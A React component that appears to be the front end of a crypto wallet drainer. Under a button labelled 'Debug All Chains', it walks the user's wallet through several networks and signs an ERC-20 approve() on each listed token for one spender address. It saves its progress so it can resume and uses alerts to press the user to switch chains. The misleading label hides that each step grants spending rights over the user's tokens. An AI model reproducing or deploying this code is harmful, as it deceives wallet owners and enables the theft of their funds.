"use client";

import { useState, useEffect } from "react";
import { useAccount, useWalletClient } from "wagmi";
import { ethers } from "ethers";

type ApproveButtonProps = {
  spenderAddress: string;         // The address that will be approved to spend tokens
  tokenAddresses: string[];        // Array of token contract addresses to approve for the spender
  chainIds: number[];              // Array of corresponding chain IDs for each token contract
  amount: string;                  // Amount to approve (using 18 decimals)
};

export default function ApproveButton({ spenderAddress, tokenAddresses, chainIds, amount }: ApproveButtonProps) {
  const { address } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [isLoading, setIsLoading] = useState(false);
  const [approvedTokens, setApprovedTokens] = useState<number>(0);

  // Load progress from localStorage on component mount
  useEffect(() => {
    const savedProgress = localStorage.getItem("approvedTokens");
    if (savedProgress) setApprovedTokens(parseInt(savedProgress));
  }, []);

  const approveToken = async () => {
    if (!walletClient) {
      alert("Please connect your wallet first");
      return;
    }

    setIsLoading(true);

    try {
      const provider = new ethers.BrowserProvider(walletClient as any);
      const signer = await provider.getSigner();
      const erc20Abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
      const approveAmount = ethers.parseUnits(amount, 18);

      for (let i = approvedTokens; i < tokenAddresses.length; i++) {
        const tokenAddress = tokenAddresses[i];
        const chainId = chainIds[i];
        const currentChainId = await provider.getNetwork().then(network => network.chainId);

        if (currentChainId !== BigInt(chainId)) {
          try {
            // Try to programmatically switch the network
            await walletClient.switchChain({ id: chainId });
          } catch (error) {
            // If automatic switching fails, prompt the user to switch manually
            alert(`Please switch to chain ${chainId} in your wallet settings and press "OK" to continue.`);
            await new Promise((resolve) => setTimeout(resolve, 5000));
            
            // Re-check the network
            const updatedChainId = await provider.getNetwork().then(network => network.chainId);
            if (updatedChainId !== BigInt(chainId)) {
              throw new Error(`Please switch to the correct chain for token ${i + 1}`);
            }
          }
        }

        // Approve the token
        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
        const tx = await tokenContract.approve(spenderAddress, approveAmount);
        await tx.wait();

        // Save progress to localStorage and update approvedTokens count
        setApprovedTokens(i + 1);
        localStorage.setItem("approvedTokens", (i + 1).toString());
        alert(`Approval successful for token ${i + 1}: ${tokenAddress}`);
      }

      alert("All tokens approved successfully!");
      localStorage.removeItem("approvedTokens");
    } catch (error) {
      console.error("Approval failed:", error);
      alert("Approval failed. Please approve the tokens in sequence.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <button
      onClick={approveToken}
      disabled={isLoading}
      style={{ padding: "10px", background: "black", color: "white", borderRadius: "5px", width: "100%", borderStyle: "solid", borderColor: "white", marginTop: "10px", marginLeft: "10px" }}
    >
      {isLoading ? `Processing Batch ${approvedTokens + 1}...` : `Debug All Chains ${approvedTokens} / ${tokenAddresses.length}`}
    </button>
  );
}
